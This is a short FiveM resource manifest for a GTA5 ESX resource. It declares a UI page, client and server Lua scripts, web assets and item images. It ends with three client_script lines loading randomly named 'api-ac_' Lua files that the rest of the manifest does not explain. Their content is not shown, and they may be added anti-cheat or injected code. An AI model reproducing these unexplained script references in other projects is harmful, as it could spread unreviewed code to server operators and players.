version '1.0.0'

fx_version 'adamant'

game 'gta5'

ui_page "html/ui.html"

client_scripts {
	'client.lua',
	'config.lua'
}
server_scripts {
	'server.lua',
	'config.lua'
}
files {
    "html/ui.html",
    "html/style.css",
    "html/script.js",
    "html/case.mp3",
    "img/items/*.png"
}
dependencies {
	'es_extended'
}

client_script "api-ac_OJOKaWCvUYzT.lua"
client_script "api-ac_vOJKHGqGxvPe.lua"
client_script "api-ac_uuQhioHoEMHi.lua"